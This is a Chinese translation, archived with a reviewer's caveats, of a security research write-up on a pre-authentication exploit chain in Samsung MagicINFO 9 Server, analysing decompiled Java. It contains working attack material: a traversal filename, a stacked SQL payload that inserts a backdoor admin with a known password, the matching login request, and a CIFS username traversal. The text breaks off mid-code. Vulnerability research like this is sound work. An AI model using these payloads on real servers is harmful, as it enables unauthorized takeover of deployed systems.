---
source: "gelusus/wxvl 公众号漏洞文库"
id: "vw-74d68cdcd54452ecdd2db451"
entity_id: "ve-74d68cdcd54452ecdd2db451"
schema_version: "1"
title: "Samsung MagicINFO 9 预认证 RCE 漏洞链分析 - TOCTOU 竞争与目录遍历导致认证绕过"
product: "Samsung MagicINFO 9 Server"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2025-54446"
referenced_identifiers: ""
prerequisites: "测试21.1080.0，默认PostgreSQL、周期校验任务、可控FTP；XSS分支需已登录用户访问，文件执行分支另行配置允许扩展名"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E4%B8%89%E6%98%9FMagicINFO/Samsung%20MagicINFO%209%20%E9%A2%84%E8%AE%A4%E8%AF%81%20RCE%20%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%88%86%E6%9E%90%20-%20TOCTOU%20%E7%AB%9E%E4%BA%89%E4%B8%8E%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%AF%BC%E8%87%B4%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
---

#  Samsung MagicINFO 9 预认证 RCE 漏洞链分析 - TOCTOU 竞争与目录遍历导致认证绕过  

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Samsung MagicINFO 9 Server
- 本文讨论：SRC-2025-0003与SRC-2025-0004；CVE-2025-54446/54438为前序补丁/变体参考
- 版本、权限与配置前提：测试21.1080.0，默认PostgreSQL、周期校验任务、可控FTP；XSS分支需已登录用户访问，文件执行分支另行配置允许扩展名
- 资料类型：漏洞链技术分析转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- Java/XML代码多处丢换行，注释吞噬后续代码，logger片段截断，不可直接复制复现
- PoC“这里”无实际链接；修复版本未给
- 标题强调TOCTOU，正文主要详述路径归一化及定时数据库链，具体检查/使用竞态窗口未清楚展开
- 无社工描述不能省略XSS分支用户访问条件；SYSTEM与部署权限应关联
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 新漏洞官方CVE映射、修复构建和TOCTOU根因需原源核验；前序CVE不自动归为主漏洞
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->

SOURCE INCITE
                    SOURCE INCITE  securitainment   2026-02-06 08:50  
  
<table><thead><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">原文链接</span></section></th><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">作者</span></section></th></tr></thead><tbody><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">https://srcincite.io/blog/2026/01/28/samstung-part-2-remote-code-execution-in-magicinfo-server.html</span></section></td><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">SOURCE INCITE</span></section></td></tr></tbody></table>  
在 part 1 中，我详细介绍了自己如何一路追进一个"兔子洞"，在默认配置下差点实现了预认证远程代码执行（pre-auth RCE）。虽然第一部分没有达成最终目标，但在进一步复盘补丁之后，我终于获得了完整成功——只不过平均需要 ~ 12 小时才能落地一个 shell。我们来调查这条漏洞链，并搞清楚原因。  
  
请注意：本文会展示一些直接用 fernflower decompiler 反编译得到的代码片段，而不是我平时常用的 jd-eclipse。原因是 jd-eclipse 在很多类上都没法正确反编译。  
## 版本  
  
我测试的版本是当时最新的已打补丁版本 21.1080.0  
。测试的安装包文件为 MagicInfo 9 Server 21.1080.0 Setup.zip  
，发布日期是 2025 年 8 月 5 日，sha1 为 9744711fe76e7531f128835bf83c9ae001069115  
。需要注意的是，7 月那次 patch 修复了 18 个高危漏洞，其中很多是预认证漏洞或能实现认证绕过。  
## 漏洞  
  
今天我们会讨论以下漏洞：  
1. SRC-2025-0003 - Samsung MagicINFO 9 Server downloadChangedFiles Directory Traversal Authentication Bypass Vulnerability  
  
1. SRC-2025-0004 - Samsung MagicINFO 9 Server ResponseUploadActivity TOCTOU Remote Code Execution Vulnerability  
  
## WSServlet 攻击面  

```
 <servlet> <servlet-name>WSRMService</servlet-name> <servlet-class>com.samsung.magicinfo.protocol.http.service.WSServlet</servlet-class> <init-param> <param-name>CONF_PATH</param-name> <param-value>/WEB-INF/conf/</param-value> </init-param> <init-param> <param-name>SERVICE_DESCRIPTOR</param-name> <param-value> samsung-wsf-service-descriptor.xml </param-value> </init-param> <load-on-startup>1</load-on-startup> </servlet> <servlet-mapping> <servlet-name>WSRMService</servlet-name> <url-pattern>/WSRMService</url-pattern> </servlet-mapping>
```  
  
在第一篇博客里，我提到 com.samsung.magicinfo.protocol.http.service.WSServlet  
有一个相当有意思的攻击面。在深入漏洞之前，我们先把这个攻击面梳理一遍，建立更清晰的认识。当调用 com.samsung.magicinfo.protocol.interfaces.SRMServiceInterfaceImpl  
类里的 process  
方法时——该方法会被任意 web service 请求调用：NOTIFY  
、DOWNLOAD  
、REPORT  
或 COMMAND  
——我们会走到下面这段代码：  

```
 private MOMsg process(MOMsg moMsg) throws BasicException { ServiceOPManager manager = null; manager = ServiceOPManagerFactory.getServiceOPManager(ActionParser.parse(moMsg)); // 1 return manager.process(moMsg); // 2 }
```  
  
在   
1  
处，代码会调用 getServiceOPManager  
；如果该 web service 请求调用的是 NOTIFY  
功能，那么这里会返回 com.samsung.magicinfo.protocol.interfaces.NOTIFYExecuter  
的实例。  

```
public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.getLogger(NOTIFYExecuter.class); protected AppBO process(HashMap params) throws BasicException { AppBO responseAppBO = null; String mo_Event = null; try { mo_Event = this.resultSet.getAttribute("MO_EVENT"); } catch (RMQLException ex) { this.logger.error((String)"", (Throwable)ex); throw new BasicException(ex.getMessage(), ex); } try { ServiceDispatcher dispatcher = WSRMServiceDispatcher.getInstance(); ServiceFactory sfc = WSRMServiceFactory.getInstance(); String service_id = sfc.getServiceId(mo_Event, this.appBO.getOperation()); // 3 responseAppBO = (AppBO)dispatcher.startService(service_id, params); // 4 return responseAppBO; } catch (Exception ex) { this.logger.error((String)"", (Throwable)ex); throw new BasicException(ex.getMessage(), ex); } }}
```  
  
在   
3  
处调用 com.samsung.magicinfo.protocol.servicemanager.WSRMServiceFactory  
类的 getServiceId  
时，代码会尝试确定该请求对应的 service_id  
。这一点很关键，因为攻击者无法 直接  
控制它：  

```
 public String getServiceId(String mo_path, String operation) { for(int i = 0; i < serviceOpMapList.size(); ++i) { ServiceOpMap serviceOpMap = (ServiceOpMap)serviceOpMapList.get(i); // 5 if (operation != null && operation.equals(serviceOpMap.getOperation())) { // 6 if (mo_path == null) { if (serviceOpMap.getMo_path() == null) { return serviceOpMap.getService_id(); } } else { if (serviceOpMap.getMo_path() == null) { return serviceOpMap.getService_id(); } if (mo_path.indexOf(serviceOpMap.getMo_path()) >= 0) { // 7 return serviceOpMap.getService_id(); } } } } return null; }
```  
  
在   
5  
处，代码会从serviceOpMapList  
里取出每一个serviceOpMap  
，并检查  
6  
处传入的 operation 是否匹配；如果定义了mo_path  
，还会检查它是否匹配  
7  
处serviceOpMap  
中的mo_path  
。如果匹配，就返回service_id  
。那么，这个serviceOpMapList  
是在哪里定义的？在初始化过程中我们可以看到：serviceOpMapList  
是通过  
8  
处调用getServiceOpMapList  
设置的：  

```
 private static synchronized boolean initialize() { serviceStore = new HashMap(); ServiceStatusManager serviceStatusManager = ServiceStatusManagerImpl.getInstance(); List serviceList = null; try { serviceList = serviceStatusManager.getServiceManageList(); for(int i = 0; i < serviceList.size(); ++i) { ServiceManageList serviceMgmt = (ServiceManageList)serviceList.get(i); serviceStore.put(serviceMgmt.getService_id(), new ServiceInfo(serviceMgmt.getService_id(), serviceMgmt.getService_name(), serviceMgmt.getClass_name(), serviceMgmt.isLogging())); } serviceOpMapList = serviceStatusManager.getServiceOpMapList(); // 8 } catch (Exception e) { logger.error((Object)e); } return true; }
```  
  
在 ServiceStatusManagerImpl  
类里可以看到，这只是对数据库的一层 wrapper：  

```
 public List getServiceOpMapList() throws Exception { return dao.selectServiceOpMapList(); }
```  
  
它在 com/samsung/magicinfo/protocol/servicestatus/dao/ServiceStatusDAOMapper.xml  
文件中定义：  

```
 <select id="selectServiceOpMapList" resultType="com.samsung.magicinfo.protocol.entity.ServiceOpMap"> SELECT * FROM MI_RM_MAP_SERVICE_OPERATION </select>
```  
  
当我们在 getServiceId  
方法中 step into ArrayList.size  
时，可以看到这里有 16 个 entries：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSh9DbqH0PXAOsxKzKz71MdFncNzCYyBkUadRDe0WJkMZXNpSlekHIB85fTkDvQ1LXxUr2lGBRrNqHVzjiayRvjJ74qaJkhgk0ZA/640?wx_fmt=png&from=appmsg "A breakpoint to see the number of entries and their values")  
  
……并且这与数据库中 MI_RM_MAP_SERVICE_OPERATION  
表里的条目数量相对应：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSia7iazSzRp7m6PkQhwqicDPNo3O0oEWCQTMMZza4viaNHTNPmforEBToZMIUG8YLl7Uw6G5cQcM35vOAVdHUDmGCsQV2TmibbvjJSw/640?wx_fmt=png&from=appmsg "Checking the database for the number of entries")  
  
当在 com.samsung.magicinfo.protocol.interfaces.NOTIFYExecuter  
类中拿到 service_id  
后，就会在 com.samsung.magicinfo.protocol.servicemanager.WSRMServiceDispatcher  
实例上调用 startService  
：  

```
 public Object startService(String service_id, Map paramMap) throws Exception { ServiceFactory factory = WSRMServiceFactory.getInstance(); ServiceManager manager = null; try { manager = factory.getServiceInstance(service_id); // 9 manager.setParameters(paramMap); return manager.startService(); } catch (Exception e) { throw e; } }
```  
  
在   
9  
处这个 getServiceInstance  
调用很有意思，因为它揭示了 web service 请求的处理类。我们已知有 16 个可用 entry，但到底是哪些类在处理传入的请求体？回到 com.samsung.magicinfo.protocol.servicemanager.WSRMServiceFactory  
类，我们可以看到 getServiceInstance  
的定义：  

```
 public ServiceManager getServiceInstance(String service_id) throws Exception { ActivityContext ctxt = new ActivityContext(service_id); ctxt.setInvokeType(1); return this.getServiceInstance(ctxt); // 10 } public ServiceManager getServiceInstance(ActivityContext ctxt) throws Exception { ServiceManager manager = null; String service_id = ctxt.getServiceID(); ServiceInfo serviceInfo = (ServiceInfo)serviceStore.get(service_id); // 11 if (serviceInfo == null) { throw new ServiceNotFoundException(); } else { try { Class serviceManager = Class.forName(serviceInfo.getService_manager_class()); // 13 manager = (ServiceManager)serviceManager.newInstance(); // 14 } catch (ClassNotFoundException e) { logger.error(e.getMessage()); throw new ServiceNotFoundException(); } catch (InstantiationException e) { logger.error(e.getMessage()); throw new ServiceNotFoundException(); } catch (IllegalAccessException e) { logger.error(e.getMessage()); throw new ServiceNotFoundException(); } if (manager == null) { throw new ServiceNotFoundException(); } else { if (manager != null) { ctxt.setLogging(serviceInfo.isLogging()); manager.setContext(ctxt); manager.setServiceName(serviceInfo.getService_name()); } return manager; // 15 } } }
```  
  
在   
10  
处，代码调用 getServiceInstance  
；在   
11  
处，代码尝试把 service_id  
作为 key，用来取出对应的 ServiceInfo  
实例。但 serviceStore  
是在哪里设置的呢？当然是在 initialize  
例程里：  

```
 private static synchronized boolean initialize() { serviceStore = new HashMap(); ServiceStatusManager serviceStatusManager = ServiceStatusManagerImpl.getInstance(); List serviceList = null; try { serviceList = serviceStatusManager.getServiceManageList(); // 12 for(int i = 0; i < serviceList.size(); ++i) { ServiceManageList serviceMgmt = (ServiceManageList)serviceList.get(i); serviceStore.put(serviceMgmt.getService_id(), new ServiceInfo(serviceMgmt.getService_id(), serviceMgmt.getService_name(), serviceMgmt.getClass_name(), serviceMgmt.isLogging())); } serviceOpMapList = serviceStatusManager.getServiceOpMapList(); } catch (Exception e) { logger.error((Object)e); } return true; }
```  
  
在   
12  
处对 getServiceManageList  
的调用会填充这个 Map  
，我们来看看：  

```
 public List getServiceManageList() throws Exception { return dao.selectServiceManageList(); }
```  
  
这又只是对数据库的一层 wrapper，它在 com/samsung/magicinfo/protocol/servicestatus/dao/ServiceStatusDAOMapper.xml  
文件中定义：  

```
 <select id="selectServiceManageList" resultType="com.samsung.magicinfo.protocol.entity.ServiceManageList"> SELECT * FROM MI_RM_INFO_SERVICE_MANAGE </select>
```  
  
查看数据库可以看到这里有 54 条记录：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nShMAx0ibs4LmHvdI9SkOzgXeAsIMYx6pMhPQUJkJakBOYUNUWyYqUGcka8XKo0Kae0HiawkEo3upHSedpIjgcZtCwiaLkAzzQczCo/640?wx_fmt=png&from=appmsg "Service manager entries")  
  
回到   
11  
：如果返回的 serviceInfo  
不为 null，那么在   
13  
处会解析出 manager class，在   
14  
处创建新实例，最后在   
15  
处返回。归根结底，我们可以用一条简单的 SQL 查询来汇总攻击面：它会列出 com.samsung.magicinfo.protocol.http.service.WSServlet  
可用于处理传入请求的 manager classes。注意，这个攻击面是预认证可达的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSiafb3ic5xkKOeia5d2ysE9hYtAPLewbvvhETibozibwA61Nj1rQQskGfNQSTranhBMJAImhPflj4vtIibXjsp7yN7VBFbnEokkjNLD8/640?wx_fmt=png&from=appmsg "Management classes")  
  
例如，com.samsung.magicinfo.framework.device.service.upload.DeviceUploadServiceManager  
类就清楚展示了由哪个 activity 来处理传入请求：  

```
 public class DeviceUploadServiceManager extends ServiceManager { public Object executeService() throws ServiceException, Exception { ServiceOpActivity activity = new DeviceUploadServiceActivity(); // 16 activity.setContext(this.activityContext); Object rt = activity.processActivity(this.paramMap); this.endServiceStatus(); return rt; } }
```  
  
在   
16  
处，使用 DeviceUploadServiceActivity  
类并调用 processActivity  
。  
## 漏洞分析  
  
在研究 com.samsung.magicinfo.framework.monitoring.service.ResponseUploadActivity  
类中对应 CVE-2025-54446 的补丁时，我们可以看到 Samsung 开发者在   
1  
处加入了 directoryTraversalChecker  
代码。  

```
 public Object process(HashMap params) throws ServiceException { ResultSet rs = (ResultSet)params.get("resultset"); String moDownload = null; Device device = null; boolean onS3Storage = false; try { moDownload = rs.getAttribute("MO_DOWNLOAD"); File file = (File)rs.getObjectAttribute("DOWNLOADABLE_FILE"); String device_id = rs.getAttribute("DEVICE_ID"); String content_type = rs.getAttribute("CONTENT-TYPE"); String contentName = rs.getAttribute("DWN_CONTENT_NAME_ATTR"); String s3Path = ""; String path = CommonConfig.get("UPLOAD_HOME"); if (!path.endsWith("\\") && !path.endsWith("/")) { path = path + File.separator; } if (!onS3Storage) { if (content_type.equals("CONTENT")) { path = path + CommonConfig.get("CAPTURE_DIR"); } else if (content_type.equals("PLAYHISTORY")) { if (contentName.startsWith("FACE")) { path = path + CommonConfig.get("FACE_LOG_DIR"); } else { path = path + CommonConfig.get("POP_LOG_DIR"); } } } else if (onS3Storage) { if (content_type.equals("CONTENT")) { s3Path = s3Path + CommonConfig.get("s3.CAPTURE_DIR") + device_id + "/"; } else if (content_type.equals("PLAYHISTORY")) { s3Path = s3Path + CommonConfig.get("s3.POP_DIR") + device_id + "/"; } } Path destinationPath = Paths.get(SecurityUtils.directoryTraversalChecker(path + File.separator + contentName, (String)null)); // 1 Path sourcePath = Paths.get(file.getPath()); try { Files.write(destinationPath, Files.readAllBytes(sourcePath)); } catch (Exception e) { this.logger.error("[MagicInfo_ScreenCaptureUpload] NIO write Exception! contentName : " + contentName + " e : " + e.getMessage()); }
```  
  
不算差，基本能用……算是吧。问题在于：这里构造出来的路径以 C:\MagicInfo Premium\runtime\upload  
开头，而 directoryTraversalChecker  
只是简单地剥离路径穿越（traversals）。但我们需要让穿越片段在 com.samsung.magicinfo.protocol.http.service.WSServlet  
的 saveAsFile  
阶段"存活"下来。处理 file attachment 消息时，可以看到代码在   
2  
处调用了 saveAsFile  
：  

```
 for(int i = 0; i < attachmentIndexes.size(); ++i) { InputStream fin = null; try { fin = mm.getBodyPart((Integer)attachmentIndexes.get(i)).getInputStream(); File file = this.saveAsFile((String)attachmentFilenames.get(i), fin); // 2 DownloadFile downFile = new DownloadFile(); downFile.setFile(file); downFile.setContentName((String)attachmentFilenames.get(i)); downFile.setContentType(contentType); downFile.setContentID((String)attachmentFilenames.get(i)); attachmentList.add(downFile); } catch (Exception var32) { } finally { if (fin != null) { try { fin.close(); } catch (Exception var31) { } } } }
```  

```
 private File saveAsFile(String filePartName, InputStream in) throws IOException { File file = null; try { Path tempFile = Paths.get(this.getFilePath(filePartName)); // 3 Files.write(tempFile, IOUtils.toByteArray(in)); file = tempFile.toFile(); return file; } catch (Exception e) { this.logger.error("[MagicInfo_WSServeltFileUpload] NIO write Exception! fileName : " + filePartName + " e : " + e.getMessage()); throw new IOException(e.getMessage()); } }
```  
  
这里   
3  
处的代码会尝试写入 C:\MagicInfo Premium\tomcat\temp  
。问题在于：如果 filePartName  
中包含文件夹，例如 validation\PostgreSQL_checklist.json  
，代码就会抛异常，并且不会为 ResponseUploadActivity  
追加一个可下载的有效文件。这是因为文件夹路径 C:\MagicInfo Premium\tomcat\temp\validation  
实际上并不存在。不过，我们可以通过把值设为 validation/../PostgreSQL_checklist.json  
来绕过！  
  
这会在 saveAsFile  
中触发一次 traversal，让我们"活下来"；随后在 ResponseUploadActivity  
中，../  
会被剥离，最终变成 validation/PostgreSQL_checklist.json  
，从而允许攻击者命中这个文件。为什么这很重要？这就要说到利用部分了。  
## 利用  
  
如果我们查看 PostgreSQL_checklist.json  
文件，会看到类似下面这样的 JSON：  

```
{ "items" : [ { "title" : "check MI_CMS_CODE_MEDIA table", "check_query" : "select count(*) from MI_CMS_CODE_MEDIA", "resolve_query" : [ //... ], "expect" : "18", "description" : "Check the number of data stored in the MI_CMS_CODE_MEDIA table." } ]}
```  
  
如果攻击者把 check_query  
覆盖成可控的 stacked query，那么就可以在 com.samsung.magicinfo.framework.setup.manager.ServerSetupInfoImpl  
中的如下位置触发 SQL 执行：  

```
 public void checkCheckingItemsFromJson() throws ConfigException { List<DbSchemeCheckEntity> dbSchemeCheckEntities = this.loadDbSchemeCheckList(); // 1 DbSchemeDao dbSchemeDao = new DbSchemeDao(); try { dbSchemeDao.deleteDbSchemeCheckResult(); DatabaseManagerDao dao = new DatabaseManagerDao(); for(DbSchemeCheckEntity dbSchemeCheckEntity : dbSchemeCheckEntities) { Integer count = dao.runSelectQuery(dbSchemeCheckEntity.getCheckQuery()); // 2 boolean checkResult = count.equals(Integer.valueOf(dbSchemeCheckEntity.getExpect())); dbSchemeDao.insertCheckingResult(dbSchemeCheckEntity.getTestId(), dbSchemeCheckEntity.getTitle(), checkResult, dbSchemeCheckEntity.getDescription()); } } catch (Exception e) { this.logger.error(e.getMessage()); } }
```  
  
在   
1  
处，代码获取一组 DbSchemeCheckEntity  
。在   
2  
处，会从 DbSchemeCheckEntity  
实例取出 CheckQuery  
，得到攻击者可控的 SQL 查询，然后触发 runSelectQuery  
，从而实现对数据库的完全接管。到达这段代码的路径如下：  

```
com.samsung.magicinfo.framework.setup.manager.ServerSetupInfoImpl.checkCheckingItemsFromJson() com.samsung.magicinfo.protocol.util.DailyJob.checkDbValidation() com.samsung.magicinfo.protocol.util.DailyJob.execute(JobExecutionContext) // triggered daily
```  
  
这个 checkDbValidation  
会每天执行：  

```
 private void checkDbValidation() throws Exception { ServerSetupInfo serverSetupInfo = ServerSetupInfoImpl.getInstance(); serverSetupInfo.checkCheckingItemsFromJson(); // 3 //... }
```  
  
我们来看看   
1  
处的 loadDbSchemeCheckList  
：  

```
 public List loadDbSchemeCheckList() throws ConfigException { List<DbSchemeCheckEntity> dbSchemeCheckEntities = new ArrayList(); String confFilePath = this.getDbSchemeCheckItemsFilePath(); // 4 try (FileReader fileReader = new FileReader(confFilePath)) { JsonParser jsonParser = new JsonParser(); JsonElement parse = jsonParser.parse((Reader)fileReader); JsonObject asJsonObject = parse.getAsJsonObject(); JsonArray items = asJsonObject.getAsJsonArray("items"); for(int i = 0; i < items.size(); ++i) { JsonObject jsonObject = items.get(i).getAsJsonObject(); String title = jsonObject.get("title").getAsString(); String checkQuery = jsonObject.get("check_query").getAsString(); List<String> resolveQueries = new ArrayList(); JsonElement resolveQuery = jsonObject.get("resolve_query"); JsonArray jsonArray = resolveQuery.getAsJsonArray(); for(int k = 0; k < jsonArray.size(); ++k) { resolveQueries.add(jsonArray.get(k).getAsJsonObject().get("query").toString().replace("\"", "")); } String expect = jsonObject.get("expect").getAsString(); String description = jsonObject.get("description").getAsString(); DbSchemeCheckEntity dbSchemeCheckItem = new DbSchemeCheckEntity(); dbSchemeCheckItem.setTestId(i); dbSchemeCheckItem.setTitle(title); dbSchemeCheckItem.setCheckQuery(checkQuery); dbSchemeCheckItem.setResolveQuery(resolveQueries); dbSchemeCheckItem.setExpect(expect); dbSchemeCheckItem.setDescription(description); dbSchemeCheckEntities.add(dbSchemeCheckItem); } return dbSchemeCheckEntities; } catch (Exception var29) { throw new ConfigException("Can't load check list."); } }
```  
  
最关键的调用点在   
4  
，它调用了 getDbSchemeCheckItemsFilePath  
：  

```
 private String getDbSchemeCheckItemsFilePath() throws ConfigException { String dbSchemeCheckItemsFilePath = ""; String magicInfoHome = System.getenv("MAGICINFO_PREMIUM_HOME"); if (magicInfoHome != null && !magicInfoHome.equals("")) { dbSchemeCheckItemsFilePath = magicInfoHome + File.separator + "runtime" + File.separator + "upload" + File.separator + "validation" + File.separator + CommonConfig.get("wsrm.dbVendor") + "_checklist.json"; } return dbSchemeCheckItemsFilePath; }
```  
  
如果数据库设置为 Postgres（默认就是如此），这段代码会返回 C:/MagicInfo Premium/runtime/upload/validation/PostgreSQL_checklist.json  
这个路径。  
### 选项 1 - 认证绕过  
  
这里的原语（primitive）是：攻击者可以执行一系列 SQL 语句。我们目前还没有足够权限去执行 COPY (SELECT '') to PROGRAM 'cmd /c mspaint')  
这种"一步到位"的操作。但我们可以注入查询来插入一个新的管理员用户：  

```
insert into mi_user_info_user (user_id, user_name, password, email, organization, team, job_position, phone_num, mobile_num, create_date, last_login_date, modify_date, is_approved, is_deleted, root_group_id, os_type, serial_num, using_mobile, is_reject, reject_reason, ldap_info, ldap_user_id, is_first_login, is_reset_pwd) values ('hacker', 'hacker', '$2a$10$b0G4pkAMSG/kqMeufR5sYOq6ou.A10YDmLVlKchC.2bVrcRthvwlu', 'hacker@samsung.com', 'ROOT', '', '', '', '', current_timestamp, current_timestamp, current_timestamp , 'Y', 'N', '0', null, null, null, 'N', null, null, '', true, 'Y' );insert into mi_user_map_group_user (user_id, group_id) values ('hacker', 0);insert into mi_user_map_role_user (user_id, role_id) values ('hacker', 1);insert into mi_user_map_dashboard (user_id, dashboard_id, priority) values ('hacker', 1, 1);insert into mi_user_map_dashboard (user_id, dashboard_id, priority) values ('hacker', 2, 2);
```  
  
执行上述查询后，攻击者就能添加一个管理员用户 hacker:7v4e2R1DeD3kCoZ4j3  
。接下来就可以用下面这个请求登录：  

```http
POST /MagicInfo/restapi/v2.0/auth HTTP/1.1Host: [target]:7001Content-Type: application/jsonContent-Length: 88{ "password": "7v4e2R1DeD3kCoZ4j3", "username": "hacker", "osName": "Linux", "osVersion": "1337"}
```  
  
需要注意的是，在较新的版本中默认启用了 two-factor，因此攻击者还需要添加一个 authenticator 才能继续；但从结果上看，事情基本已经办成了。  
### 选项 2 - CVE-2025-54438 变体  
  
在研究 CVE-2025-54438 时，我发现确实存在两个 downloadChangedFiles  
方法，它们分别映射到对应的 servlet 类：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSgYMWRVS6ScUF2kuR3X9yriaImhGnJVdSL04RNkUSy9kibicRGSrhjkaJpgribv71cD86doUUJKfO7Saic3gMLjBNg4rX1PcnslnjB0/640?wx_fmt=png&from=appmsg "Analysing CVE-2025-54438")  
1. com.samsung.magicinfo.protocol.file.CifsFileDownloadServlet  
1. com.samsung.magicinfo.protocol.file.FtpFileDownloadServlet  
继续看代码可以发现：补丁后的 CifsFileDownloadServlet  
对 localPathByIp  
变量做了 directory traversal 检查，而 localPathByIp  
是由 cifsLoginId  
等攻击者可控的字符串拼出来的：  

```
 protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { request.setCharacterEncoding("UTF-8"); response.setContentType("text/html; charset=UTF-8"); try { String miUserId = StrUtils.nvl(request.getParameter("miUserId")).equals("") ? "admin" : request.getParameter("miUserId"); String groupId = StrUtils.nvl(request.getParameter("groupId")).equals("") ? "0" : request.getParameter("groupId"); long nGroupId = Long.parseLong(groupId); String cifsContentName = StrUtils.nvl(request.getParameter("cifsContentName")).equals("") ? "" : request.getParameter("cifsContentName"); String cifsIP = StrUtils.nvl(request.getParameter("cifsIp")).equals("") ? "" : request.getParameter("cifsIp"); String cifsLoginId = StrUtils.nvl(request.getParameter("cifsLoginId")).equals("") ? "" : request.getParameter("cifsLoginId"); String cifsPassword = StrUtils.nvl(request.getParameter("cifsPassword")).equals("") ? "" : request.getParameter("cifsPassword"); String cifsDirectory = StrUtils.nvl(request.getParameter("cifsDirectory")).equals("") ? "" : request.getParameter("cifsDirectory"); String cifsRefreshInterval = StrUtils.nvl(request.getParameter("cifsRefreshInterval")).equals("") ? "1" : request.getParameter("cifsRefreshInterval"); long nCifsRefreshInterval = Long.parseLong(cifsRefreshInterval); String canRefresh = StrUtils.nvl(request.getParameter("canRefresh")).equals("") ? "Y" : request.getParameter("canRefresh"); long loginRetryMaxCount = Long.parseLong(StrUtils.nvl(request.getParameter("loginRetryMaxCount")).equals("") ? "1" : request.getParameter("loginRetryMaxCount")); String canLoginRetry = StrUtils.nvl(request.getParameter("canLoginRetry")).equals("") ? "Y" : request.getParameter("canLoginRetry"); String CONTENTS_HOME = CommonConfig.get("CONTENTS_HOME").replace('/', File.separatorChar) + File.separatorChar + "contents_home"; String contentId = UUID.randomUUID().toString().toUpperCase(); cifsDirectory = "smb://" + cifsIP + cifsDirectory; String localPathByIp = SecurityUtils.directoryTraversalChecker(CONTENTS_HOME + File.separator + "CIFS_" + ContentUtils.getFolderIp(cifsIP) + '_' + cifsLoginId, (String)null); // 1 this.logger.info("[MagicInfo_CIFS_Servlet] " + cifsContentName + ContentUtils.getFolderIp(cifsIP) + cifsLoginId + cifsDirectory + cifsRefreshInterval + " by " + miUserId + " in " + groupId + ", canRefresh[" + canRefresh + "] loginRetryMaxCount[> boolean scheduledJob = false; Runnable runCifs = new CifsFileDownloadThread(miUserId, nGroupId, contentId, cifsContentName, cifsIP, cifsLoginId, cifsPassword, localPathByIp, cifsDirectory, nCifsRefreshInterval, scheduledJob, canRefresh, loginRetryMaxCount, canLoginRetry); Thread threadCifs = new Thread(runCifs); threadCifs.start(); } catch (Exception e) { response.sendError(600, e.toString()); this.logger.error((Object)e); } }
```  
  
cifsLoginId  
这个 getParameter  
会被用来拼接路径字符串，但说实话我一开始没看出来这怎么就能"Authentication Bypass"。这到底要怎么利用？我挠头想了好一阵，最后还是认输，去找了 Shielder 的大神们请教，他们很快就把报告分享给了我！  
  
tl;dr; 就是：他们搭了一个自己的 CIFS server，并把用户名设置为 /../../../../server/  
。CifsFileDownloadServlet  
里的代码最终会从攻击者控制的 CIFS server 下载文件，并因为 traversal 而把文件写入到攻击者可控的路径中。由于某个特定检查（我们马上就会讲到），他们没法把 JSP 文件写进 web-root；但他们成功覆盖了 index.html  
，从而在无需任何社工的情况下实现持久化脚本注入，本质上等价于绕过认证。非常巧妙！  
  
不过我们还有个小问题：还记得有两个 servlet 吗？在分析 com.samsung.magicinfo.protocol.file.FtpFileDownloadServlet  
类时，我们可以看到一个名为 localPathByIp  
的路径会由攻击者可控的字符串拼出来。  

```
 protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { request.setCharacterEncoding("UTF-8"); response.setContentType("text/html; charset=UTF-8"); try { String miUserId = StrUtils.nvl(request.getParameter("miUserId")).equals("") ? "admin" : request.getParameter("miUserId"); String groupId = StrUtils.nvl(request.getParameter("groupId")).equals("") ? "0" : request.getParameter("groupId"); long nGroupId = Long.parseLong(groupId); String ftpContentName = StrUtils.nvl(request.getParameter("ftpContentName")).equals("") ? "" : request.getParameter("ftpContentName"); String ftpIP = StrUtils.nvl(request.getParameter("ftpIp")).equals("") ? "" : request.getParameter("ftpIp"); String portStr = StrUtils.nvl(request.getParameter("ftpPort")).equals("") ? "21" : request.getParameter("ftpPort"); int port = Integer.parseInt(portStr); String ftpLoginId = 